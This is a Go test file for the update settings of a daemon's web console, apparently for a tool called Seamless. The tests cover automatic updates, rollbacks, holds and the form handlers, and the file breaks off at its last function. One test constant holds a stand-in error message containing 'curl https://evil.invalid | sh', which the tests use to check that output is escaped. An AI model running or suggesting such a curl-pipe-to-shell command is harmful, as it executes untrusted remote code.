package console

import (
	"context"
	"errors"
	"fmt"
	"html/template"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/arctop/seamless/internal/config"
	"github.com/arctop/seamless/internal/core"
	"github.com/arctop/seamless/internal/store"
	"github.com/arctop/seamless/internal/update"
)

// autoBase is the file/env update block of a daemon that updates itself on
// the defaults: checks every 6h, a 24h soak and a 24h deadline.
var autoBase = config.Update{
	CheckInterval: config.Duration(6 * time.Hour),
	MaxDefer:      config.Duration(24 * time.Hour),
	MinAge:        config.Duration(24 * time.Hour),
}

// autoStatus is releaseStatus on a daemon that updates itself: an updater is
// wired, and the settings are autoBase merged with no override (checks and
// automatic updates on by default), so Mode is ModeAuto.
func autoStatus(now time.Time) update.Status {
	st := releaseStatus(now)
	st.CanApply = true
	st.Settings = update.Effective(autoBase, config.UpdateOverride{}, true)
	return st
}

// withNewer makes v0.7.3 the newest release, published the day before now and
// carrying the checksums bundle.
func withNewer(st *update.Status, now time.Time) {
	st.Newest = &update.Release{Version: ver(0, 7, 3), PublishedAt: now.Add(-30 * time.Hour), ChecksumsBundle: true}
	st.Available = true
}

// attemptErrorText stands for an updater's own error summary: owner-only text
// that may name paths and commands, and markup that must stay escaped.
const attemptErrorText = "rollback failed <b>badly</b>: run curl https://evil.invalid | sh, backup at /tmp/x.tar.gz"

// requestWithCanceledContext is an authenticated POST whose context has ended:
// the browser gave up waiting.
func requestWithCanceledContext(path string) *http.Request {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	req := httptest.NewRequestWithContext(ctx, http.MethodPost, path, nil)
	req.Header.Set("Authorization", "Bearer "+testKey)
	return req
}

// The automatic-updates parts of the section, in each state that changes
// them: the switch row and its line, the first card's newest release and
// Update now, the update under way, and the alert card -- one item per state,
// each with its action, the attempt's error only in its hint.
func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
	now := time.Now()
	const autoOn = `<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves" checked>`
	for _, tc := range []struct {
		name   string
		base   config.Update
		mutate func(st *update.Status)
		want   []string
		absent []string
	}{
		{
			name: "up to date",
			base: autoBase,
			want: []string{
				`<div class="set-row" id="updates-auto">`, "<strong>Install updates by themselves</strong>",
				`<span class="set-row-sub">On: a new release installs by itself at a quiet moment.</span>`,
				"A new release installs by itself once it is 24h old, when no agent session is live, or at a lull in requests after waiting 24h. " +
					"Seamless restarts to finish; a release that fails its health check is rolled back and skipped. To update by hand, run seamlessd update.",
				`<form method="post" action="/console/settings/updates/auto" id="updates-auto-form" data-autosave>`,
				`<input type="hidden" name="auto" value="off">`, autoOn,
				"Up to date</span>",
			},
			absent: []string{"/console/settings/updates/apply", "confirm(", "/console/settings/updates/resume", `role="alert"`,
				"Last update", `class="up-hand"`},
		},
		{
			name: "waiting for live sessions",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Target = st.Newest
				st.PendingSince = now.Add(-5 * time.Hour)
				st.WaitCode, st.Waiting = update.WaitSessions, "waiting for 2 live agent sessions to go idle, or at a lull in requests in 19h"
			},
			want: []string{
				`<span class="mono">v0.7.3</span> installs by itself: waiting for 2 live agent sessions to go idle, or at a lull in requests in 19h`,
				"pending since 5h ago", "deadline in 19h",
				`data-confirm="Install v0.7.3 now? The daemon restarts to finish, so agent sessions lose Seamless for a moment. This skips the soak and does not wait for agents to go idle." data-confirm-label="Install now"`,
				"Update to v0.7.3 now</button>", "v0.7.3 is out &middot; ",
			},
			absent: []string{"disabled title=", "On: a new release installs"},
		},
		{
			name: "soaking",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Newest.PublishedAt = now.Add(-6 * time.Hour)
				st.WaitCode, st.Waiting = update.WaitSoak, "v0.7.3 waits out its 24h soak, about 18h to go"
			},
			want: []string{
				`<span class="mono">v0.7.3</span> installs by itself once it is 24h old`,
				"soak ends around " + string(clockDate(now.Add(18*time.Hour))),
			},
			absent: []string{"pending since"},
		},
		{
			name: "applying",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Stage: update.StageVerify, SpawnedAt: now.Add(-2 * time.Minute)}
				st.Target, st.WaitCode, st.Waiting = st.Newest, update.WaitInProgress, "updating to v0.7.3: verify"
			},
			want: []string{
				`<span class="badge accent up-chip">`, "Updating to v0.7.3</span>",
				"v0.7.2 &rarr; v0.7.3: verifying the release &middot; automatic", "started 2m ago",
			},
			// The update under way stands where Update now would.
			absent: []string{"confirm(", "/console/settings/updates/apply", "installs by itself:"},
		},
		{
			// The installer restarted the daemon on v0.7.3 before the record
			// moved past install: the card speaks from the new version's side.
			name: "confirming",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Version, st.Available = "0.7.3", false
				st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Stage: update.StageInstall, SpawnedAt: now.Add(-2 * time.Minute)}
			},
			want: []string{
				`<span class="badge ok up-chip">`, "Confirming v0.7.3</span>",
				"v0.7.2 &rarr; v0.7.3: the new version is serving; the updater is confirming it", "started 2m ago",
			},
			absent: []string{`<span class="badge accent up-chip">`, "running the installer"},
		},
		{
			name: "rolled back, blocked",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeRolledBack, Stage: update.StageRollback, RolledBack: true,
					Error: attemptErrorText, LogPath: "/data/update/logs/01M4.log", FoldedAt: now.Add(-20 * time.Minute)}
				st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockRolledBack, At: now.Add(-20 * time.Minute)}}
				st.WaitCode, st.Waiting = update.WaitBlocked, "automatic updates skip v0.7.3: the update to it rolled back"
			},
			want: []string{
				`<div class="up-alert is-warn" role="alert">`, `data-alert="attempt"`, "<strong>The update to v0.7.3 rolled back.</strong>",
				"It failed after installing, and v0.7.2 was restored. Automatic updates skip v0.7.3: the update to it rolled back.",
				// The skip is the attempt's own line; its meaning and the
				// updater's message wait in the hint, escaped.
				"Resume does not clear them, and Update now does not skip them.",
				"The updater said: rollback failed &lt;b&gt;badly&lt;/b&gt;: run curl https://evil.invalid | sh, backup at /tmp/x.tar.gz",
				`<span class="up-cmd" title="/data/update/logs/01M4.log">`, `data-copy="/data/update/logs/01M4.log"`,
				"Update to v0.7.3 now</button>",
			},
			absent: []string{"<b>badly</b>", `data-alert="skipped"`, "/console/settings/updates/resume", "installs by itself:"},
		},
		{
			name: "paused",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Paused = &update.Pause{Reason: update.PauseRollbacks, Versions: []update.Version{ver(0, 7, 3), ver(0, 7, 4)}, At: now.Add(-time.Hour)}
			},
			want: []string{
				`data-alert="paused"`, "<strong>Automatic updates paused themselves.</strong>",
				"Two updates in a row rolled back (v0.7.3, v0.7.4). Update now still works.",
				`<form method="post" action="/console/settings/updates/resume">`, "Resume</button>",
				`<span class="set-row-sub">On, but they paused themselves: see above.</span>`,
			},
			absent: []string{"installs by itself:"},
		},
		{
			name: "held",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Hold = &update.Hold{Through: ver(0, 7, 3), From: ver(0, 7, 3), At: now.Add(-48 * time.Hour)}
				st.WaitCode, st.Waiting = update.WaitHeld, "v0.7.3 is held back: this install went back from v0.7.3"
			},
			want: []string{
				`data-alert="held"`, "<strong>Releases up to v0.7.3 are held back.</strong>", "This install went back from v0.7.3.",
				"Resume lets automatic updates take them again; Update now lifts the hold too.", "Resume</button>",
			},
			absent: []string{"installs by itself:"},
		},
		{
			name: "interrupted, backing off",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeInterrupted, Stage: update.StageBackup, FoldedAt: now.Add(-20 * time.Minute)}
				st.Backoff = &update.Backoff{Until: now.Add(40 * time.Minute), Count: 2, Version: ver(0, 7, 3), Reason: update.OutcomeInterrupted}
			},
			want: []string{
				"<strong>The update to v0.7.3 did not finish.</strong>", "v0.7.2 still runs.",
				"The attempt on v0.7.3 was interrupted (2 in a row); automatic updates try again", ">in 40m</time>.",
			},
			absent: []string{`data-alert="backoff"`},
		},
		{
			name: "refused at the gates: a stale binary, with the owner's restart",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: update.RefusalStaleBinary,
					Error: "gates: the installed seamlessd is not v0.7.2", FoldedAt: now.Add(-20 * time.Minute)}
			},
			want: []string{
				"<strong>The update to v0.7.3 failed.</strong>",
				"It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed. " +
					"Restart the service so it runs the installed release: seamlessd restart.",
				"The updater said: gates: the installed seamlessd is not v0.7.2",
			},
		},
		{
			name: "refused at the gates from another version: what happened, no action",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 1), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: update.RefusalStaleBinary,
					Error: "gates: the installed seamlessd is not v0.7.1", FoldedAt: now.Add(-20 * time.Minute)}
			},
			want:   []string{"It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed."},
			absent: []string{"seamlessd restart"},
		},
		{
			name: "a refusal word from a newer updater reads as a plain failure",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: "disk_full",
					Error: "gates: the disk is full", FoldedAt: now.Add(-20 * time.Minute)}
			},
			want:   []string{"It stopped while checking it may install now, before anything changed."},
			absent: []string{"disk_full", "seamlessd restart"},
		},
		{
			name: "applied with warnings",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 1), To: ver(0, 7, 2), Why: update.WhyAuto,
					Outcome: update.OutcomeApplied, Stage: update.StageDone, Warnings: true,
					Error: "applied with warnings: hooks for Claude Code were not rewired", FoldedAt: now.Add(-time.Hour)}
			},
			want: []string{
				"<strong>v0.7.2 applied with warnings.</strong>",
				"v0.7.2 serves, but the installer reported a problem, so some agent wiring may be stale. Run seamlessd install-hooks to re-wire your agents.",
				`<span class="up-cmd"><span class="mono">seamlessd install-hooks</span>`, `data-copy="seamlessd install-hooks"`,
				"The updater said: applied with warnings: hooks for Claude Code were not rewired",
			},
			absent: []string{"Last update"},
		},
		{
			name: "a failed rollback names how to recover",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyNow,
					Outcome: update.OutcomeBroken, Stage: update.StageRollback, Error: "To recover:\n  1. reinstall v0.7.2", FoldedAt: now}
				st.Paused = &update.Pause{Reason: update.PauseBroken, Versions: []update.Version{ver(0, 7, 3)}, At: now}
			},
			want: []string{
				`<div class="up-alert is-danger" role="alert">`,
				`<div class="up-alert-item is-danger" data-alert="paused">`, `<div class="up-alert-item is-danger" data-alert="attempt">`,
				"<strong>The update to v0.7.3 could not be rolled back cleanly.</strong>",
				"could not be restored cleanly, so automatic updates paused themselves. Its details say how to recover.",
				"v0.7.2 to v0.7.3, Update now: not rolled back.", "The updater said: To recover:\n  1. reinstall v0.7.2",
			},
		},
		{
			name: "update.auto: false in the config file",
			base: func() config.Update { b := autoBase; b.Auto = boolPtr(false); return b }(),
			mutate: func(st *update.Status) {
				b := autoBase
				b.Auto = boolPtr(false)
				st.Settings = update.Effective(b, config.UpdateOverride{Auto: boolPtr(true)}, true)
				withNewer(st, now)
			},
			want: []string{
				`<span class="set-row-sub">Off: new releases are announced, and installing one is your call.</span>`,
				// The file decides this one switch: its locked chip sits
				// beside it, with where to change it in its hint, and the
				// head's chip says where the rest comes from.
				`<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves" disabled>`,
				"update.auto: false is set in the config file or SEAMLESS_UPDATE_AUTO; change it there.",
				`<span class="src-chip is-file">`,
				"Update to v0.7.3 now</button>", // Update now works whatever update.auto says
			},
			absent: []string{`name="auto" value="off"`},
		},
		{
			name: "checks turned off in the console",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.Settings = update.Effective(autoBase, config.UpdateOverride{Check: boolPtr(false), Auto: boolPtr(true)}, true)
			},
			want: []string{
				`<span class="set-row-sub">Off while update checks are off: with no update traffic there is nothing to install.</span>`,
				`<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves" disabled>`,
				`<form id="updates-reset"`,
			},
			absent: []string{`name="auto" value="off"`, "src-chip is-locked"},
		},
		{
			name: "automatic updates turned off in the console",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
			},
			want: []string{
				`<span class="set-row-sub">Off: new releases are announced, and installing one is your call.</span>`,
				`<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves">`,
				`<span class="src-chip is-override">`,
				"Automatic updates are set here, which wins over the config file until you reset it; update checks follow the build&#39;s default.",
				`<form id="updates-reset" method="post" action="/console/settings/updates/reset"></form>`,
			},
			absent: []string{"The build&#39;s default:", `name="auto" value="off"`},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			if tc.mutate != nil {
				tc.mutate(&st)
			}
			_, mux, _ := newUpdatesConsole(t, tc.base, &st)
			sec := updatesSection(t, mux)
			for _, want := range tc.want {
				require.Contains(t, sec, want)
			}
			for _, gone := range tc.absent {
				require.NotContains(t, sec, gone)
			}
			// A value the file makes final is said once, by its chip, and
			// its switch carries no sentence of its own; no row of the old
			// list survives.
			require.LessOrEqual(t, strings.Count(sec, "Config file decides"), 1)
			require.LessOrEqual(t, strings.Count(sec, "update.auto"), 1)
			require.NotContains(t, sec, "<dt>")
			require.NotContains(t, sec, "Turn automatic updates")
		})
	}
}

// An install that cannot update itself gets none of the automatic-update
// controls: the first card's To update row says what to run, and why.
func TestUpdatesSection_NotifyOnlyInstallsGetNoAutoControls(t *testing.T) {
	now := time.Now()
	for name, mutate := range map[string]func(st *update.Status){
		"no updater wired": func(st *update.Status) { st.CanApply = false },
		"homebrew": func(st *update.Status) {
			st.Install = update.Install{Kind: update.KindHomebrew, Reason: "installed by Homebrew, which owns its files", Hint: update.Hint(update.KindHomebrew)}
		},
		"a build from source": func(st *update.Status) {
			st.Version, st.Distribution, st.Release = "0.0.0-dev", update.DistributionSource, false
			st.Install = update.Install{Kind: update.KindSource, Reason: "built from source (make install, go install or go build)", Hint: update.Hint(update.KindSource)}
		},
	} {
		t.Run(name, func(t *testing.T) {
			st := autoStatus(now)
			withNewer(&st, now)
			st.Hold = &update.Hold{Through: ver(0, 7, 3), From: ver(0, 7, 3), At: now}
			mutate(&st)
			_, mux, _ := newUpdatesConsole(t, autoBase, &st)
			sec := updatesSection(t, mux)
			for _, gone := range []string{`id="updates-auto"`, "/console/settings/updates/auto",
				"/console/settings/updates/apply", "/console/settings/updates/resume", `data-alert="held"`} {
				require.NotContains(t, sec, gone)
			}
			require.Contains(t, sec, `<span class="up-kicker">To update</span><span class="mono">`+template.HTMLEscapeString(st.Install.Hint))
		})
	}
}

// TestUpdatesSection_SoakWordedOnce: the automatic-updates hint, the next
// update's line and the version fact's hover word update.min_age alike, with
// update.SpanWords. They used to disagree on one page for a soak that is not
// a whole number of hours: "once they are 90m old" above "once it is 1h30m
// old".
func TestUpdatesSection_SoakWordedOnce(t *testing.T) {
	now := time.Now()
	base := autoBase
	base.MinAge = config.Duration(90 * time.Minute)
	st := autoStatus(now)
	st.Settings = update.Effective(base, config.UpdateOverride{}, true)
	withNewer(&st, now)
	st.Newest.PublishedAt = now.Add(-30 * time.Minute)
	st.WaitCode, st.Waiting = update.WaitSoak, "v0.7.3 waits out its 90m soak, about 1h to go"

	_, mux, _ := newUpdatesConsole(t, base, &st)
	sec := updatesSection(t, mux)
	require.Contains(t, sec, "A new release installs by itself once it is 90m old")
	require.Contains(t, sec, `<span class="mono">v0.7.3</span> installs by itself once it is 90m old`)
	require.NotContains(t, sec, "1h30m")
	_, then := newestFate(st, now)
	require.Equal(t, "it installs by itself once it is 90m old", then)
}

// Update now: a success says what started, and each refusal is its own
// message, built from the status the checker returned.
func TestUpdatesApplyNow_Flashes(t *testing.T) {
	now := time.Now()
	applying := func(st update.Status) update.Status {
		st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyNow, SpawnedAt: now}
		return st
	}
	refuse := func(err error, mutate func(st *update.Status)) func(update.Status) (update.Status, error) {
		return func(st update.Status) (update.Status, error) {
			if mutate != nil {
				mutate(&st)
			}
			return st, err
		}
	}
	for _, tc := range []struct {
		name      string
		mutate    func(st *update.Status)
		applyNow  func(update.Status) (update.Status, error)
		wantParam string
		wantMsg   string
	}{
		{name: "started", applyNow: func(st update.Status) (update.Status, error) { return applying(st), nil },
			wantParam: "notice", wantMsg: "Updating to v0.7.3 (from v0.7.2). The daemon restarts to finish; this section shows how it went."},
		{name: "checks off", applyNow: refuse(update.ErrChecksOff, nil),
			wantParam: "error", wantMsg: "Update checks are off, so nothing was installed. Turn them on first."},
		{name: "cannot apply: no updater", mutate: func(st *update.Status) { st.CanApply = false },
			applyNow:  refuse(fmt.Errorf("%w: no updater is wired into this daemon", update.ErrCannotApply), nil),
			wantParam: "error", wantMsg: "Nothing was installed: this daemon does not install updates by itself (no updater is wired into this daemon). To update it, run seamlessd update."},
		{name: "cannot apply: homebrew", mutate: func(st *update.Status) {
			st.Install = update.Install{Kind: update.KindHomebrew, Reason: "installed by Homebrew, which owns its files", Hint: update.Hint(update.KindHomebrew)}
		}, applyNow: refuse(fmt.Errorf("%w: installed by Homebrew, which owns its files", update.ErrCannotApply), nil),
			wantParam: "error", wantMsg: "Nothing was installed: this daemon does not install updates by itself (installed by Homebrew, which owns its files). To update it, run brew upgrade --cask arctop/tap/seamless."},
		{name: "in progress", applyNow: refuse(update.ErrInProgress, func(st *update.Status) { *st = applying(*st) }),
			wantParam: "error", wantMsg: "An update to v0.7.3 is already in progress. This section shows how it goes."},
		{name: "in progress, an updater we did not start", applyNow: refuse(update.ErrInProgress, nil),
			wantParam: "error", wantMsg: "An update is already in progress. This section shows how it goes."},
		{name: "too soon", applyNow: refuse(update.ErrTooSoon, nil),
			wantParam: "error", wantMsg: "The last release check failed less than a minute ago, so nothing was installed. Try again in a minute."},
		{name: "up to date", applyNow: refuse(update.ErrUpToDate, nil),
			wantParam: "error", wantMsg: "Nothing to install: no release newer than v0.7.2 is known."},
		{name: "unsigned", applyNow: refuse(update.ErrUnsigned, func(st *update.Status) {
			withNewer(st, now)
			st.Newest.ChecksumsBundle = false
		}), wantParam: "error", wantMsg: "Nothing was installed: v0.7.3 carries no signed checksums bundle, which Update now verifies."},
		{name: "not running", applyNow: refuse(update.ErrNotRunning, nil),
			wantParam: "error", wantMsg: "The update checker is not running. Restart the daemon to revive it."},
		{name: "a failed re-check", applyNow: refuse(errors.New("update.Fetch: unexpected status 502 Bad Gateway"), nil),
			wantParam: "error", wantMsg: "Update now failed: update.Fetch: unexpected status 502 Bad Gateway"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			withNewer(&st, now)
			if tc.mutate != nil {
				tc.mutate(&st)
			}
			_, mux, fake := newUpdatesConsole(t, autoBase, &st)
			fake.applyNow = tc.applyNow
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/apply", ""))
			require.Equal(t, tc.wantParam, param)
			require.Equal(t, tc.wantMsg, msg)
			require.Equal(t, 1, fake.applies)
		})
	}
}

// When the request stops waiting, the flash says the request gave up -- the
// command runs on in the checker.
func TestUpdatesApplyNowAndResume_RequestGaveUp(t *testing.T) {
	for _, tc := range []struct{ path, want string }{
		{"/console/settings/updates/apply", "Stopped waiting for Update now. It carries on; this section shows the update once it starts."},
		{"/console/settings/updates/resume", "Stopped waiting for the update checker. The resume carries on; this section shows the result."},
	} {
		st := autoStatus(time.Now())
		_, mux, fake := newUpdatesConsole(t, autoBase, &st)
		fake.applyNow = func(st update.Status) (update.Status, error) { return st, context.Canceled }
		fake.resume = func(st update.Status) (update.Status, error) { return st, context.Canceled }
		param, msg := locationOf(t, do(mux, requestWithCanceledContext(tc.path)))
		require.Equal(t, "error", param, tc.path)
		require.Equal(t, tc.want, msg)
	}
}

// Resume says what it lifted, and whether automatic updates can now run.
func TestUpdatesResume_SaysWhatItLifted(t *testing.T) {
	now := time.Now()
	pause := &update.Pause{Reason: update.PauseRollbacks, Versions: []update.Version{ver(0, 7, 3), ver(0, 7, 4)}, At: now}
	hold := &update.Hold{Through: ver(0, 7, 4), From: ver(0, 7, 4), At: now}
	for _, tc := range []struct {
		name      string
		mutate    func(st *update.Status)
		resume    func(update.Status) (update.Status, error)
		wantParam string
		wantMsg   string
	}{
		{name: "the pause", mutate: func(st *update.Status) { st.Paused = pause },
			wantParam: "notice", wantMsg: "Lifted the pause (two updates in a row rolled back). Automatic updates can install new releases again."},
		{name: "the hold", mutate: func(st *update.Status) { st.Hold = hold },
			wantParam: "notice", wantMsg: "Lifted the hold on releases up to v0.7.4. Automatic updates can install new releases again."},
		{name: "both", mutate: func(st *update.Status) { st.Paused, st.Hold = pause, hold },
			wantParam: "notice", wantMsg: "Lifted the pause (two updates in a row rolled back) and the hold on releases up to v0.7.4. Automatic updates can install new releases again."},
		{name: "with automatic updates off", mutate: func(st *update.Status) {
			st.Hold = hold
			st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
		}, wantParam: "notice", wantMsg: "Lifted the hold on releases up to v0.7.4. Automatic updates are switched off, so nothing installs by itself until you turn them on."},
		{name: "nothing to lift",
			wantParam: "notice", wantMsg: "Nothing to resume: automatic updates were neither paused nor holding releases back."},
		{name: "not running", mutate: func(st *update.Status) { st.Paused = pause },
			resume:    func(st update.Status) (update.Status, error) { return st, update.ErrNotRunning },
			wantParam: "error", wantMsg: "The update checker is not running. Restart the daemon to revive it."},
		{name: "another failure", mutate: func(st *update.Status) { st.Paused = pause },
			resume:    func(st update.Status) (update.Status, error) { return st, errors.New("boom") },
			wantParam: "error", wantMsg: "Could not resume automatic updates: boom"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			if tc.mutate != nil {
				tc.mutate(&st)
			}
			_, mux, fake := newUpdatesConsole(t, autoBase, &st)
			fake.resume = tc.resume
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/resume", ""))
			require.Equal(t, tc.wantParam, param)
			require.Equal(t, tc.wantMsg, msg)
			require.Equal(t, 1, fake.resumes)
		})
	}
}

// The automatic-updates switch stores the console's Auto (keeping its Check),
// refuses "on" while the config file or environment keeps it off, and names
// the valid values for anything else.
func TestUpdatesAuto_StoresTheSwitch(t *testing.T) {
	now := time.Now()
	t.Run("off then on", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, fake := newUpdatesConsole(t, autoBase, &st)
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned off: new releases are still announced, and installing one is your call.", msg)
		o, found := storedOverride(t, db)
		require.True(t, found)
		require.Equal(t, config.UpdateOverride{Auto: boolPtr(false)}, o)
		require.False(t, fake.Status().Settings.Auto, "the checker re-read the stored switch")
		require.Equal(t, update.SourceConsole, fake.Status().Settings.AutoSource)

		sec := updatesSection(t, mux)
		require.Contains(t, sec, "Off: new releases are announced, and installing one is your call.", "the page the redirect lands on shows the new state")
		require.Contains(t, sec, `<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves">`)

		param, msg = locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned on. Seamless installs new releases by itself once they are 24h old, "+
			"when no agent session is live, or at a lull in requests after waiting 24h.", msg)
		o, _ = storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Auto: boolPtr(true)}, o)
	})

	t.Run("an auto save keeps the stored Check, and a check save the stored Auto", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, _ := newUpdatesConsole(t, autoBase, &st)
		require.NoError(t, store.SetUpdateOverride(context.Background(), db, config.UpdateOverride{Check: boolPtr(false)}))
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned on. They apply once update checks are back on.", msg)
		o, _ := storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Check: boolPtr(false), Auto: boolPtr(true)}, o)

		param, _ = locationOf(t, postForm(mux, "/console/settings/updates", "check=on"))
		require.Equal(t, "notice", param)
		o, _ = storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Check: boolPtr(true), Auto: boolPtr(true)}, o)
	})

	t.Run("on, while automatic updates paused themselves", func(t *testing.T) {
		st := autoStatus(now)
		st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
		st.Paused = &update.Pause{Reason: update.PauseRollbacks, At: now}
		_, mux, _ := newUpdatesConsole(t, autoBase, &st)
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned on. They paused themselves earlier (two updates in a row rolled back): resume them to let them run again.", msg)
	})

	t.Run("on, on an install that does not update itself", func(t *testing.T) {
		st := releaseStatus(now)
		_, mux, _ := newUpdatesConsole(t, config.Update{}, &st)
		_, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "Automatic updates turned on. This install does not install releases by itself, so nothing changes here.", msg)
	})

	t.Run("an unreadable stored row is replaced", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, _ := newUpdatesConsole(t, autoBase, &st)
		require.NoError(t, store.SetSetting(context.Background(), db, store.SettingUpdateConfig, `{"auto":"yes"}`))
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
		require.Equal(t, "notice", param)
		require.Contains(t, msg, "The stored update setting was unreadable and has been replaced.")
		o, _ := storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Auto: boolPtr(false)}, o)
	})

	for _, tc := range []struct {
		name, body, want string
	}{
		{"missing", "", "auto is required: valid values are on, off"},
		{"not a value", "auto=yes", `auto invalid "yes": valid values are on, off`},
		{"empty", "auto=", `auto invalid "": valid values are on, off`},
		{"twice", "auto=on&auto=off", "auto must be given exactly once: valid values are on, off"},
		{"the check field instead", "check=on", "auto is required: valid values are on, off"},
	} {
		t.Run("refused: "+tc.name, func(t *testing.T) {
			st := autoStatus(now)
			db, mux, fake := newUpdatesConsole(t, autoBase, &st)
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", tc.body))
			require.Equal(t, "error", param)
			require.Equal(t, tc.want, msg)
			_, found := storedOverride(t, db)
			require.False(t, found, "nothing is stored")
			_, refreshes := fake.counts()
			require.Zero(t, refreshes)
		})
	}

	// Locked: the file or environment keeps automatic updates off.
	for _, tc := range []struct {
		name string
		base config.Update
		want string
	}{
		{"update.auto: false", func() config.Update { b := autoBase; b.Auto = boolPtr(false); return b }(),
			"Automatic updates stay off: update.auto: false is set in the config file or SEAMLESS_UPDATE_AUTO; change it there."},
		{"update.check: false", func() config.Update { b := autoBase; b.Check = boolPtr(false); return b }(),
			"Automatic updates stay off: update.check: false is set in the config file or SEAMLESS_UPDATE_CHECK; change it there."},
		{"both", func() config.Update { b := autoBase; b.Check, b.Auto = boolPtr(false), boolPtr(false); return b }(),
			"Automatic updates stay off: update.auto: false is set in the config file or SEAMLESS_UPDATE_AUTO; change it there."},
	} {
		t.Run("locked: "+tc.name, func(t *testing.T) {
			st := autoStatus(now)
			st.Settings = update.Effective(tc.base, config.UpdateOverride{}, true)
			require.True(t, st.Settings.AutoLocked)
			db, mux, fake := newUpdatesConsole(t, tc.base, &st)
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
			require.Equal(t, "error", param)
			require.Equal(t, tc.want, msg)
			_, found := storedOverride(t, db)
			require.False(t, found, "nothing is stored")
			_, refreshes := fake.counts()
			require.Zero(t, refreshes)

			// Off is never refused: the more restrictive setting wins anyway.
			param, _ = locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
			require.Equal(t, "notice", param)
		})
	}

	t.Run("a stopped checker picks the change up at the next start", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, fake := newUpdatesConsole(t, autoBase, &st)
		fake.refreshErr = update.ErrNotRunning
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned off: new releases are still announced, and installing one is your call. "+
			"The update checker is not running, so the change applies when the daemon next starts.", msg)
		_, found := storedOverride(t, db)
		require.True(t, found)
	})
}

// On an install that updates itself, Reset says where both switches landed.
func TestUpdatesReset_NamesBothSwitches(t *testing.T) {
